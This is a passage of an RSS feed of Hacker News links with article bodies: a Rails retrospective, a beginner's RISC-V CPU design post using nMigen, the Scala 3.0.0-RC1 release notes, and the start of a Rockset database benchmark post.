Rails.</p><h3 id="ruby">Ruby</h3><p>Ruby is a pretty pleasant language to work in. Sure, it has a lot of syntax and a sprawling standard library, but you don‚Äôt have to use all of that if you don‚Äôt want to. It took me a while to adjust to the object-oriented way of doing things - in particular, the idea that you can‚Äôt just have a free-range function floating out there, unassociated with a class or module, like you can in JavaScript. And you can‚Äôt just create an arbitrary one-off object - you either need to define a class to create an object, or use a Hash to store data.</p><p>But Ruby‚Äôs standard library isn‚Äôt that huge. I‚Äôve seen JavaScript‚Äôs ‚Äòstandard library‚Äô grow a lot too, and frankly it‚Äôs nice to have methods like <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/padStart"><code>String.prototype.padStart</code></a> instead of having every little thing in userspace. The only part that felt actively weird was <a href="https://rubygems.org/gems/activesupport/versions/6.1.1">activesupport</a> - a gem that extends Ruby‚Äôs core objects, but is part of Rails. It felt weird to have <em>string</em> methods that would only work if your environment was Rails.</p><p>The <a href="https://kapeli.com/dash">Dash</a> app for documentation rocketed from my pile of unused tools to an absolute must-have. In the world of Ruby and Rails, with <em>most</em> gems having pretty good, semi-standard documentation, you can search for, and get answers, super fast. The Ruby language documentation and the Rails documentation is absolutely great. The JavaScript equivalent - <a href="https://developer.mozilla.org/en-US/">MDN</a> - pales in comparison.</p><h2 id="the-bad">The bad</h2><h3 id="the-asset-pipeline">The asset pipeline</h3><p>Remember SASS and the YUI Compressor? These are, unfortunately, defaults in the <a href="https://guides.rubyonrails.org/asset_pipeline.html">asset pipeline</a>. There‚Äôs <a href="https://edgeguides.rubyonrails.org/webpacker.html">Webpacker</a> too, which has a parallel approach to CSS and images as the asset pipeline. It has <a href="https://github.com/rails/webpacker#integrations">opinionated integrations</a> with stuff like React. Ah, and I should mention that Rails‚Äôs <a href="https://github.com/rails/rails/tree/main/actionview/app/assets/javascripts">JavaScript utilities are written in‚Ä¶ CoffeeScript</a>.</p><p>I get it - it‚Äôs hard to keep up with the latest trends in frontend. But this is one ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://macwright.com/2021/02/18/a-year-of-rails.html">https://macwright.com/2021/02/18/a-year-of-rails.html</a></em></p>]]>
            </description>
            <link>https://macwright.com/2021/02/18/a-year-of-rails.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26184215</guid>
            <pubDate>Thu, 18 Feb 2021 19:17:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designing a RISC-V CPU, Part 1]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26184136">thread link</a>) | @newswasboring
<br/>
February 18, 2021 | https://mcla.ug/blog/risc-v-cpu-part-1.html#fnref:3 | <a href="https://web.archive.org/web/*/https://mcla.ug/blog/risc-v-cpu-part-1.html#fnref:3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
	
	<p><span>Tue 16 February 2021</span></p><p>I have no experience in digital logic design. That is, I didn't until I
recently decided that I would like to try designing my own CPU and running it
on an FPGA! If you too are a software engineer with a vague interest in
hardware design, I hope this series of posts about what I've learnt will be
helpful and interesting. In this first installment, I hope to answer these
questions:</p>
<ul>
<li>
<p>What is digital logic design?</p>
</li>
<li>
<p>How do I get started, and what tools might I use?</p>
</li>
</ul>
<p>In future installments, I will go into more detail about my CPU design and the
RISC-V architecture, as well as hopefully answering these questions:</p>
<ul>
<li>
<p>What about digital logic design is fundamentally different from software
  design?</p>
</li>
<li>
<p>What about digital logic design is similar to software design?</p>
</li>
</ul>
<p>You can see the code for my CPU at the time of writing
<a href="https://github.com/lochsh/riscy-boi/tree/47e94dc6e9665f73c871add002c34d1516fd5106">here</a>
or an up to date version <a href="https://github.com/lochsh/riscy-boi">here</a>.</p>
<h2>What is digital logic design?</h2>
<p>Digital logic design is designing logic circuits that operate on binary values.
The elementary components are logic gates: an AND gate, for example, has two
inputs and one output. The output is 1 iff<sup id="fnref:1"><a href="#fn:1">1</a></sup> both inputs are 1.</p>
<p>Typically, we design synchronous circuits which use flip-flops to store state,
and thereby synchronise the operation of the circuit to a common clock.
Flip-flops are composed of logic gates.</p>
<p>Analogue circuit design is concerned with the electronic components that make
up logic gates, like transistors and diodes. This level of abstraction is often
needed for applications dealing directly with signals derived from analogue
sensors, like radio receivers. When designing a CPU, this level of abstraction
would not be feasible: modern CPUs can have billions of transistors!</p>
<p>Instead, we use tools that can translate our digital logic design into
different useful formats: the configuration of an FPGA (see below); a
simulation; silicon layout.</p>
<h2>What is an FPGA and why are they used?</h2>
<p>We noted above that the same digital logic design tools can be used whether we
are creating a custom ASIC to be made into silicon, or configuring an FPGA. A
Field-Programmable Gate Array is an integrated circuit containing an array of
programmable logic blocks. You could imagine it is as a big array of logic
gates that can be connected together in various ways.</p>
<p>Making a custom chip generally costs millions, and of course once your chip is
manufactured it cannot be changed. Thus, generally FPGAs are used when:</p>
<ul>
<li>
<p>You cannot afford to create a custom ASIC due to lack of capital (e.g. if
  you're just some hacker like me and not ARM or Intel)</p>
</li>
<li>
<p>You cannot afford to create a custom ASIC because your volume is too low to
  make it worth the high one-off costs (e.g. if you are making a small quantity
  of MRI machines with custom data acquisition hardware)</p>
</li>
<li>
<p>You need the flexibility</p>
</li>
</ul>
<p>The downsides? FPGAs have a much higher per-chip cost, and they are generally
much slower as a consequence of being able to connect logic blocks together in
very flexible ways. In contrast, a custom design can be reduced to the minimum
number of transistors, with no concern for flexibility.</p>
<p>I think it's helpful context to compare the custom ASIC design process against
that of an FPGA design:</p>
<ul>
<li>
<p><span>Logic design</span>: just like we'd do for an FPGA, the logic design of an ASIC is
  done in a hardware description language.</p>
</li>
<li>
<p><span>Verification</span>: FPGA designs may well be verified, but you might expect the
  process for an ASIC design to be more rigorous ‚Äì after all, the design
  can't be changed once manufactured! Often verification will involve formally
  verifying<sup id="fnref:2"><a href="#fn:2">2</a></sup> parts of the design.</p>
</li>
<li>
<p><span>Synthesis</span>: This creates a <em>netlist</em>: a list of logic blocks and their
  connections. The connections are called <em>nets</em>, and the blocks are called
  <em>cells</em>. For both FPGAs and ASICs, the cells are vendor-specific.</p>
</li>
<li>
<p><span>Placement and routing</span> (P&amp;R): for an FPGA, this involves mapping the logic
  blocks described in the netlist to actual blocks in the FPGA. The resulting
  binary is often called a <em>bitstream</em>.  For an ASIC, this involves deciding
  where to place the cells on the silicon, and how to connect them up. Both
  applications generally use automated optimisation tools for this.</p>
</li>
</ul>
<h2>What tools do I need?</h2>
<h3>A hardware description language: I am using <a href="https://github.com/nmigen/nmigen">nMigen</a><sup id="fnref:3"><a href="#fn:3">3</a></sup></h3>
<p>You may have heard of Verilog or VHDL: both popular hardware description
languages (HDLs). I use "popular" here to mean widely used, not widely loved.</p>
<p>I won't pretend to know much about these tools: I only know that smarter people
than me with vast logic design experience have a lot of hate for them.
Due to the problems with Verilog and other similar tools, there have been
various attempts at making more useful and friendlier alternatives.  nMigen is
one such project, which creates a domain-specific language in Python. In their
own words:</p>
<blockquote>
<p>Despite being faster than schematics entry, hardware design with Verilog and
VHDL remains tedious and inefficient for several reasons. The event-driven
model introduces issues and manual coding that are unnecessary for
synchronous circuits, which represent the lion's share of today's logic
designs. Counterintuitive arithmetic rules result in steeper learning curves
and provide a fertile ground for subtle bugs in designs. Finally, support for
procedural generation of logic (metaprogramming) through "generate"
statements is very limited and restricts the ways code can be made generic,
reused and organized.</p>
<p>To address those issues, we have developed the nMigen FHDL, a library that
replaces the event-driven paradigm with the notions of combinatorial and
synchronous statements, has arithmetic rules that make integers always behave
like mathematical integers, and most importantly allows the design's logic to
be constructed by a Python program. This last point enables hardware
designers to take advantage of the richness of the Python language‚Äîobject
oriented programming, function parameters, generators, operator overloading,
libraries, etc.‚Äîto build well organized, reusable and elegant designs.</p>
</blockquote>
<p>If, like me, you've never used Verilog, then not all of this will have more
than abstract meaning to you. But it certainly sounds promising,
and I can attest that it has been very straightforward to get started with
logic design without the reportedly large barrier of grappling with Verilog. I
would recommend it, particularly if you are already familiar with Python!</p>
<p>The only downside I can think of is that nMigen is still in development, and
in particular the documentation is not complete. There is a helpful community
at #nmigen on <a href="https://mcla.ug/blog/chat.freenode.net">chat.freenode.net</a>.</p>
<h3>A wave viewer for inspecting simulations: I am using <a href="http://gtkwave.sourceforge.net/">GTKWave</a></h3>
<p>nMigen provides simulation tooling: I use it in my tests, written using
<code>pytest</code>. I record the signals during these tests and view them in a wave
viewer to help debug.</p>
<p><img alt="gtkwave" src="https://mcla.ug/blog/images/gtkwave.png" title="A screenshot of GTKWave"></p>
<h3>Optional: An FPGA dev board. I am using a myStorm BlackIce II</h3>
<p>You don't need an FPGA dev board to create your own CPU. You could do
everything in simulation! The fun of having a board to work with, for me, is
being able to flash LEDs and see my design in action.</p>
<p>Of course, if you were creating something more useful than my very basic CPU,
then you would probably want some hardware to run it on, and this would be less
"optional"!</p>
<h2>Getting started with nMigen</h2>
<p>Rather than immediately trying to design a CPU, I started by making an
Arithmetic Logic Unit (ALU) in nMigen. The ALU is a key piece of any CPU design
that I have seen: it performs arithmetic operations.</p>
<p>Why start with this? I knew I would need an ALU for my CPU; I knew I could make
a simple one; I knew that the feeling of making something is an important
motivator when starting a new project!</p>
<p>My design looked something like this:</p>

<div>
<pre id="vimCodeElement"><span id="L1"> 1 </span><span>"""</span><span>Arithmetic Logic Unit</span><span>"""</span>
<span id="L2"> 2 </span><span>import</span> enum
<span id="L3"> 3 </span>
<span id="L4"> 4 </span><span>import</span> nmigen <span>as</span> nm
<span id="L5"> 5 </span>
<span id="L6"> 6 </span>
<span id="L7"> 7 </span><span>class</span> <span>ALUOp</span><span>(</span>enum<span>.</span>IntEnum<span>)</span><span>:</span>
<span id="L8"> 8 </span>    <span>"""</span><span>Operations for the ALU</span><span>"""</span>
<span id="L9"> 9 </span>    ADD <span>=</span> <span>0</span>
<span id="L10">10 </span>    SUB <span>=</span> <span>1</span>
<span id="L11">11 </span>
<span id="L12">12 </span>
<span id="L13">13 </span><span>class</span> <span>ALU</span><span>(</span>nm<span>.</span>Elaboratable<span>)</span><span>:</span>
<span id="L14">14 </span>    <span>"""</span>
<span id="L15">15 </span><span>    Arithmetic Logic Unit</span>
<span id="L16">16 </span>
<span id="L17">17 </span><span>    * op (in): the opcode</span>
<span id="L18">18 </span><span>    * a (in): the first operand</span>
<span id="L19">19 </span><span>    * b (in): the second operand</span>
<span id="L20">20 </span>
<span id="L21">21 </span><span>    * o (out): the output</span>
<span id="L22">22 </span><span>    </span><span>"""</span>
<span id="L23">23 </span>
<span id="L24">24 </span>    <span>def</span> <span>__init__</span><span>(</span>self<span>,</span> width<span>)</span><span>:</span>
<span id="L25">25 </span>        <span>"""</span>
<span id="L26">26 </span><span>        Initialiser</span>
<span id="L27">27 </span>
<span id="L28">28 </span><span>        Args:</span>
<span id="L29">29 </span><span>            width (int): data width</span>
<span id="L30">30 </span><span>        </span><span>"""</span>
<span id="L31">31 </span>        self<span>.</span>op <span>=</span> nm<span>.</span>Signal<span>()</span>
<span id="L32">32 </span>        self<span>.</span>a <span>=</span> nm<span>.</span>Signal<span>(</span>width<span>)</span>
<span id="L33">33 </span>        self<span>.</span>b <span>=</span> nm<span>.</span>Signal<span>(</span>width<span>)</span>
<span id="L34">34 </span>        self<span>.</span>o <span>=</span> nm<span>.</span>Signal<span>(</span>width<span>)</span>
<span id="L35">35 </span>
<span id="L36">36 </span>    <span>def</span> <span>elaborate</span><span>(</span>self<span>,</span> _<span>)</span><span>:</span>
<span id="L37">37 </span>        m <span>=</span> nm<span>.</span>Module<span>()</span>
<span id="L38">38 </span>
<span id="L39">39 </span>        <span>with</span> m<span>.</span>Switch<span>(</span>self<span>.</span>op<span>)</span><span>:</span>
<span id="L40">40 </span>            <span>with</span> m<span>.</span>Case<span>(</span>ALUOp<span>.</span>ADD<span>)</span><span>:</span>
<span id="L41">41 </span>                m<span>.</span>d<span>.</span>comb <span>+=</span> self<span>.</span>o<span>.</span>eq<span>(</span>self<span>.</span>a <span>+</span> self<span>.</span>b<span>)</span>
<span id="L42">42 </span>            <span>with</span> m<span>.</span>Case<span>(</span>ALUOp<span>.</span>SUB<span>)</span><span>:</span>
<span id="L43">43 </span>                m<span>.</span>d<span>.</span>comb <span>+=</span> self<span>.</span>o<span>.</span>eq<span>(</span>self<span>.</span>a <span>-</span> self<span>.</span>b<span>)</span>
<span id="L44">44 </span>        <span>return</span> m
</pre>
</div>

<p>As you can see, we've created a lot of nMigen <code>Signal</code> instances to represent
well...the signals that define the interface to our ALU! But what is this
<code>elaborate</code> method? My understanding is that "elaboration" is the name for the
first step in synthesising the netlist (see above). The idea in the nMigen code
above is that we've created some <em>elaboratable</em> structure (by inheriting from
<code>nm.Elaboratable</code>), i.e. something that describes digital logic we want to
synthesise. The <code>elaborate</code> method describes that digital logic. It has to
return an nMigen <code>Module</code>.</p>
<p>Let's have a closer look at the contents of the <code>elaborate</code> method. The
<code>Switch</code> will create some kind of decision logic in the synthesised design.
But what is <code>m.d.comb</code>? nMigen has the concept of synchronous (<code>m.d.sync</code>)
and combinatorial<sup id="fnref:4"><a href="#fn:4">4</a></sup> (<code>m.d.comb</code>) control domains. From the nMigen
<a href="https://nmigen.info/nmigen/latest/lang.html#lang-domains">docs</a>:</p>
<blockquote>
<p>A control domain is a named group of signals that change their value in
identical conditions.</p>
<p>All designs have a single predefined <em>combinatorial domain</em>, containing all
signals that change immediately when any value used to compute them changes.
The name comb is reserved for the combinatorial domain.</p>
<p>A design can also have any amount of user-defined <em>synchronous domains</em>, also
called clock domains, containing signals that change when a specific edge
occurs on the domain‚Äôs ‚Ä¶</p></blockquote></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mcla.ug/blog/risc-v-cpu-part-1.html#fnref:3">https://mcla.ug/blog/risc-v-cpu-part-1.html#fnref:3</a></em></p>]]>
            </description>
            <link>https://mcla.ug/blog/risc-v-cpu-part-1.html#fnref:3</link>
            <guid isPermaLink="false">hacker-news-small-sites-26184136</guid>
            <pubDate>Thu, 18 Feb 2021 19:11:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scala 3.0.0-RC1 ‚Äì first release candidate is here]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26184110">thread link</a>) | @tmfi
<br/>
February 18, 2021 | https://dotty.epfl.ch/blog/2021/02/17/scala3-rc1.html | <a href="https://web.archive.org/web/*/https://dotty.epfl.ch/blog/2021/02/17/scala3-rc1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content-wrapper"> 
   <main> 
    <header> 
      
      
    </header> 
    <p>Greetings from the Scala 3 team! We are delighted to announce the first release candidate of the stable version of Scala 3 ‚Äì Scala 3.0.0-RC1.</p> 
    <p>This release brings some last-minute polishings, clean-ups and changes before the big release. There were a few language changes to improve the user experience, as well as the polishings of the metaprogramming framework. We have also worked on the issues that had to be fixed before the stable release.</p> 
    <p>Overall, more than <a href="https://github.com/lampepfl/dotty/pulls?q=is%3Apr+is%3Aclosed+closed%3A%3E2020-12-02+sort%3Acomments-desc">400 PRs</a> were merged after the M3 release and until today! Read more below!</p> <!--more--> 
     
    <p>Type parameters on extensions can now be combined with type parameters on the methods themselves. E.g.:</p> 
    <pre><code>List(1, 2, 3).second[Int]
extension [A](xs: List[A])
   def sumBy[B](f: A =&gt; B)(using Numeric[B]): B = ...
</code></pre> 
    <p>Type arguments matching method type parameters are passed as usual:</p> 
    <pre><code>List("a", "bb", "ccc").sumBy[Int](_.length)
</code></pre> 
    <p>By contrast, type arguments matching type parameters following <code>extension</code> can be passed only if the method is referenced as a non-extension method:</p> 
    <pre><code>sumBy[String](List("a", "bb", "ccc"))(_.length)
</code></pre> 
    <p>Or, when passing both type arguments:</p> 
    <pre><code>sumBy[String](List("a", "bb", "ccc"))[Int](_.length)
</code></pre> 
    <p>For discussion, see <a href="https://github.com/lampepfl/dotty/pull/10940">PR #10940</a>. For more information about the extension methods, see <a href="https://dotty.epfl.ch/docs/reference/contextual/extension-methods.html">documentation</a>.</p> 
     
    <p>The following are the changes to the <code>import</code> syntax made in this release.</p> 
    <p>Wildcard import <code>_</code> is replaced by <code>*</code>. The motivation is that the majority of other languages use <code>*</code>. For example:</p> 
    <pre><code>import scala.annotation.*  // imports everything in the annotation package
</code></pre> 
    <p>Renaming operator <code>=&gt;</code> is replaced by a soft keyword <code>as</code>. <code>as</code> is also allowed outside braces. For example:</p> 
    <pre><code>import scala.collection.mutable as mut
import NumPy as np
</code></pre> 
    <p>For the details and discussion, see <a href="https://github.com/lampepfl/dotty/pull/11244">PR #11244</a>. Read more about this change in the <a href="https://dotty.epfl.ch/docs/reference/changed-features/imports.html">documentation</a>.</p> 
     
    <p><a href="https://github.com/lampepfl/dotty/pull/11240">PR #11240</a> changed the syntax of vararg splices in patterns and function arguments. The new syntax uses a postfix <code>*</code>, instead of <code>: _*</code>, analogously to how a vararg parameter is declared.</p> 
     
    <p>An obscure use of <code>_</code> occurs in var definitions:</p> 
    <pre><code>var x: T = _
</code></pre> 
    <p>It defines a concrete variable x without an initial value, or rather the default initial value that the JVM assigns to object fields. It can only be used in a class or object, not to initialize a local variable.</p> 
    <p>We came up with an arguably better way to express this idiom: the special <code>uninitialized</code> value in the <code>scala.compiletime</code> object. To get an uninitialized field, you now write:</p> 
    <pre><code>import scala.compiletime.uninitialized

var x: A = uninitialized
</code></pre> 
    <p>This way expresses the intent of the idiom in a more verbose and easy to read way than simply writing an underscore.</p> 
    <p>For discussion, see <a href="https://github.com/lampepfl/dotty/pull/11231">PR #11231</a>, and the <a href="https://dotty.epfl.ch/docs/reference/dropped-features/wildcard-init.html">documentation</a> is available on our website.</p> 
     
    <p>Starting from RC1, we no longer generate a function parent for companions of case classes. Which means, for example, that given <code>case class Foo(x: Int)</code>, you won't be able to use <code>Foo</code> in a position where a function is expected:</p> 
    <pre><code>case class Foo(x: Int)
def f(g: Int =&gt; Foo) = g(10)

f(Foo)
</code></pre> 
    <p>Results in:</p> 
    <pre><code>1 |f(Foo)
  |  ^^^
  |The method `apply` is inserted. The auto insertion will be deprecated, please write `Foo.apply` explicitly.
</code></pre> 
    <p>As the warning suggests, now you should write <code>Foo.apply</code> instead of <code>Foo</code>. See <a href="https://github.com/lampepfl/dotty/issues/6190">Issue #6190</a> and <a href="https://github.com/lampepfl/dotty/pull/7207">PR #7207</a> for discussion.</p> 
     
    <p>We have settled on using the well-known <code>scaladoc</code> as a name for the documentation tool for Scala 3 (known previously as <code>scala3doc</code>).. The obsolete <code>dotty-doc</code> (or <code>scala3-doc</code>) is removed in RC1. We have also removed all the Kotlin dependencies (Dokka, etc.) from scaladoc. For details, see <a href="https://github.com/lampepfl/dotty/pull/11349">PR #11349</a>. To read more about <code>scaladoc</code>, see <a href="https://dotty.epfl.ch/docs/usage/scaladoc/index.html">documentation</a></p> 
     
    <p><a href="https://github.com/lampepfl/dotty/pull/11355">PR #11355</a> changes the <code>-source</code> specifier for the Scala version(s) after 3.0 from <code>3.1</code> to <code>future</code>. I.e. it is now <code>-source future</code> and <code>-source future-migration</code> instead of <code>-source 3.1</code> and <code>-source 3.1-migration</code>. Language imports are changed analogously. The reason for the change is that we want to keep the possibility open to ship a <code>3.1</code> version that does not yet contain all the changes enabled under <code>-source future</code>.</p> 
     
    <ul> 
     <li>Warn when matching against an opaque type <a href="https://github.com/lampepfl/dotty/pull/10664">#10664</a></li> 
     <li>Fix <a href="https://github.com/lampepfl/dotty/issues/8634">#8634</a>: Support -release option <a href="https://github.com/lampepfl/dotty/pull/10746">#10746</a> ‚Äì the same way Scala 2 does. This setting allows you to specify a version of the Java platform (8, 9 etc) and compile the code with classes specific to the that Java platform, and emit the bytecode for that version.</li> 
    </ul> 
     
    <p>A lot of work has been done on the metaprogramming side of things. Mostly we are cleaning up and polishing the API to prepare it for the stable release. The following are the important metaprogramming changes that took place:</p> 
    <ul> 
     <li>Add <code>scala.quoted.Expr.unapply</code> as dual of <code>Expr.apply</code> <a href="https://github.com/lampepfl/dotty/pull/10580">#10580</a></li> 
     <li>Remove <code>Expr.StringContext.unapply</code> <a href="https://github.com/lampepfl/dotty/pull/10675">#10675</a></li> 
     <li>Add reflect <code>MatchCase</code> <code>TypeRepr</code> <a href="https://github.com/lampepfl/dotty/pull/10735">#10735</a></li> 
     <li>Rename <code>scala.quoted.staging.{Toolbox =&gt; Compiler}</code> <a href="https://github.com/lampepfl/dotty/pull/11129">#11129</a></li> 
     <li>Fix <a href="https://github.com/lampepfl/dotty/issues/10863">#10863</a>: Make show <code>AnyKind</code>ed <a href="https://github.com/lampepfl/dotty/pull/10988">#10988</a></li> 
     <li>Add ParamClause to allow multiple type param clauses <a href="https://github.com/lampepfl/dotty/pull/11074">#11074</a></li> 
     <li>Rework reflect Symbol fields API <a href="https://github.com/lampepfl/dotty/pull/10705">#10705</a></li> 
     <li>Rename <code>Liftable</code> to <code>ToExpr</code> and <code>Unliftable</code> to <code>FromExpr</code> <a href="https://github.com/lampepfl/dotty/pull/10618">#10618</a></li> 
     <li>Expand non-transparent macros after Typer <a href="https://github.com/lampepfl/dotty/pull/9984">#9984</a></li> 
     <li>Rework TastyInspector API to allow inspection of all files <a href="https://github.com/lampepfl/dotty/pull/10792">#10792</a></li> 
     <li>Allow leading context parameters in extension methods <a href="https://github.com/lampepfl/dotty/pull/10940">#10940</a></li> 
     <li>Rename <code>Not</code> to <code>NotGiven</code> to make its purpose clearer <a href="https://github.com/lampepfl/dotty/pull/10720">#10720</a></li> 
     <li>Fix <a href="https://github.com/lampepfl/dotty/issues/10709">#10709</a>: Add missing level check before inlining <a href="https://github.com/lampepfl/dotty/pull/10781">#10781</a></li> 
    </ul> 
     
    <p>If you have questions or any sort of feedback, feel free to send us a message on our <a href="https://gitter.im/lampepfl/dotty">Gitter channel</a>. If you encounter a bug, please <a href="https://github.com/lampepfl/dotty/issues/new">open an issue on GitHub</a>.</p> 
    <h2><a href="#contributors" id="contributors"></a>Contributors</h2> 
    <p>Thank you to all the contributors who made this release possible üéâ</p> 
    <p>According to <code>git shortlog -sn --no-merges 3.0.0-M3..3.0.0-RC1</code> these are:</p> 
    <pre><code>   183  Martin Odersky
   138  Nicolas Stucki
    36  Krzysztof Romanowski
    25  Filip Zyba≈Ça
    25  Liu Fengyun
    24  Lan, Jian
    22  Jamie Thompson
    19  Tom Grigg
    17  Andrzej Ratajczak
    16  St√©phane Micheloud
    15  Guillaume Martres
    11  Pawe≈Ç Marks
     9  Phil
     6  Aleksander Boruch-Gruszecki
     6  Jonathan Brachth√§user
     6  Natsu Kagami
     6  odersky
     4  Jasper Moeys
     4  Adrien Piquerez
     3  S√©bastien Doeraene
     3  Micha≈Ç Pa≈Çka
     3  Albert Chen
     2  Alexandre Archambault
     2  Som Snytt
     2  kenji yoshida
     2  Luc Henninger
     2  Ayush
     2  Raphael Jolly
     2  Anatolii Kmetiuk
     2  Olivier Blanvillain
     2  changvvb
     1  ysthakur
     1  Ang Hao Yang
     1  Ang9876
     1  AngAng
     1  August Nagro
     1  Ciara O'Brien
     1  Dale Wijnand
     1  Florian Cassayre
     1  Florian Schmaus
     1  Iltotore
     1  Jason Zaugg
     1  Julien Richard-Foy
     1  Katrix
     1  Master-Killer
     1  Michael Pilquist
     1  Mikael Blomstrand
     1  Mike Samuel
     1  Philippus
     1  Philippus Baalman
     1  Rick M
     1  Stephane MICHELOUD
     1  Timur Abishev
     1  Tomas
     1  ansvonwa
     1  ayush
     1  costa100
     1  iroha168
     1  noti0na1
     1  riiswa
     1  tanishiking
</code></pre> 
    <p>If you want to get your hands dirty and contribute to Scala 3, now is a good time to get involved! Head to our <a href="https://dotty.epfl.ch/docs/contributing/getting-started.html">Getting Started page for new contributors</a>, and have a look at some of the <a href="https://github.com/lampepfl/dotty/issues?q=is%3Aissue+is%3Aopen+label%3Aexp%3Anovice">good first issues</a>. They make perfect entry points into hacking on the compiler.</p> 
    <p>We are looking forward to having you join the team of contributors.</p> 
    <hr> 
    <p><img id="author-img" src="https://dotty.epfl.ch/images/anatolii.png"> <span id="author-signature"> Anatolii Kmetiuk </span> 
    </p> 
   </main> 
  </div></div>]]>
            </description>
            <link>https://dotty.epfl.ch/blog/2021/02/17/scala3-rc1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26184110</guid>
            <pubDate>Thu, 18 Feb 2021 19:09:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rockset is up to 9.4 times faster than Druid on Star Schema Benchmark queries]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26184105">thread link</a>) | @box2A1
<br/>
February 18, 2021 | https://rockset.com/blog/rockset-up-to-9x-faster-than-apache-druid-star-schema-benchmark/ | <a href="https://web.archive.org/web/*/https://rockset.com/blog/rockset-up-to-9x-faster-than-apache-druid-star-schema-benchmark/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Real-time analytics is all about deriving insights and taking actions as soon as data is produced. When broken down into its core requirements, real-time analytics means two things: access to fresh data and fast responses to queries. These are essentially two measures of latency, which we term data latency and query latency, respectively.</p>
<p>Data latency is the time from when data is produced to when it can be queried, and is a function of how efficiently a database can sustain writes. As it usually gets less focus in benchmarks, we released <a href="https://rockset.com/blog/rockset-1-billion-events-in-a-day-with-1-second-data-latency/">RockBench</a>, a data latency benchmark, last September. Using RockBench, we ascertained Rockset‚Äôs suitability for many real-time analytics applications due to its ability to keep data latency to under 1 second, while ingesting 1 billion events per day, on a standard 4XLarge Virtual Instance.</p>
<h3>Query Latency and the Star Schema Benchmark</h3>
<p>Query latency is the second key measure of real-time analytics performance and is the focus of the rest of this post.
To evaluate query latency, we turned to the Star Schema Benchmark (SSB), an industry-standard benchmark to measure database performance on analytical applications. The SSB was designed for a batch analytics scenario, rather than real-time analytics, but will still yield useful insight into Rockset‚Äôs performance on analytical queries.</p>
<p>The SSB has also been used for performance measurements of other modern data technologies. In June 2020, Imply released a <a href="https://go.imply.io/rs/910-OTN-223/images/Apache-Druid-and-Google-BigQuery-performance-evaluation.pdf">study</a> of Apache Druid and Google BigQuery performance on the SSB. For the Rockset benchmark, we used the same hardware resources that were used in the Druid benchmark to provide greater context for our SSB evaluation.</p>
<h3>Up to 9.4x Faster than Druid</h3>
<p>From the benchmarking results, we observed one SSB query execute 9.4x faster on Rockset than on Druid, with many queries running 2x to 4x faster. The entire SSB suite ran 1.5x faster on <a href="https://rockset.com/comparisons/rockset-vs-apache-druid">Rockset compared to Druid</a>. This demonstrates better performance with resource parity, since pricing was not available for a true price-performance comparison.</p>
<p>In making these comparisons, we recognize we are not experts in configuring Druid, so we relied on a benchmark report from those who have the most knowledge about their system and can tune it best. In addition, benchmarks represent a snapshot in time, and systems will get faster with each new release. We are using the most recent benchmark published by Imply for comparison, but we expect Druid performance will continue to improve, as will Rockset‚Äôs.</p>
<h3>Running the Star Schema Benchmark on Rockset</h3>
<p><strong>Benchmark Overview</strong></p>
<p>The SSB comprises a suite of 13 analytical SQL queries that provide a good combination of functional and selectivity coverage.</p>
<p>We conducted the benchmark using SSB data at scale factor 100, which corresponds to 100GB and 600M rows of data. We denormalized the generated data prior to loading to provide a more direct comparison to the Druid benchmark, which avoided query-time joins, since Druid only recently added some limited join support.</p>
<p><span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/1d31s1aajogl/6wQnA481EPGFKQEBq9jqlD/c385adf28f987ec64149ee5ce6b6af4c/rockset-ssb-diagram.png?w=560&amp;fm=webp 560w,
https://images.ctfassets.net/1d31s1aajogl/6wQnA481EPGFKQEBq9jqlD/c385adf28f987ec64149ee5ce6b6af4c/rockset-ssb-diagram.png?w=1120&amp;fm=webp 1120w,
https://images.ctfassets.net/1d31s1aajogl/6wQnA481EPGFKQEBq9jqlD/c385adf28f987ec64149ee5ce6b6af4c/rockset-ssb-diagram.png?w=2240&amp;fm=webp 2240w" sizes="(max-width: 590px) 100vw, 590px" type="image/webp">
          <source srcset="https://images.ctfassets.net/1d31s1aajogl/6wQnA481EPGFKQEBq9jqlD/c385adf28f987ec64149ee5ce6b6af4c/rockset-ssb-diagram.png?w=560 560w,
https://images.ctfassets.net/1d31s1aajogl/6wQnA481EPGFKQEBq9jqlD/c385adf28f987ec64149ee5ce6b6af4c/rockset-ssb-diagram.png?w=1120 1120w,
https://images.ctfassets.net/1d31s1aajogl/6wQnA481EPGFKQEBq9jqlD/c385adf28f987ec64149ee5ce6b6af4c/rockset-ssb-diagram.png?w=2240 2240w" sizes="(max-width: 590px) 100vw, 590px">
          <img alt="rockset-ssb-diagram" title="" src="https://images.ctfassets.net/1d31s1aajogl/6wQnA481EPGFKQEBq9jqlD/c385adf28f987ec64149ee5ce6b6af4c/rockset-ssb-diagram.png" loading="lazy">
        </picture>
        </span>
      </span>
<em>Figure 1: Performance harness used to generate and load SSB data, run queries and measure query runtimes</em></p>
<p>Loading into Rockset was straightforward and required zero configuration, apart from specifying some keys for column-based clustering. Once the SSB data was loaded into Rockset, we ran a load-generator query script, based on the Rockset Python client, that issued queries and measured runtimes.</p>
<p><strong>Benchmark Results</strong></p>
<p>We recorded the following runtimes across the 13 SSB queries.</p>
<p><span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/1d31s1aajogl/gtyqIwjx5kKG2PxpXGrJk/2842c3354e855724fee008c2a252a1da/rockset-ssb-results.png?w=281&amp;fm=webp 281w,
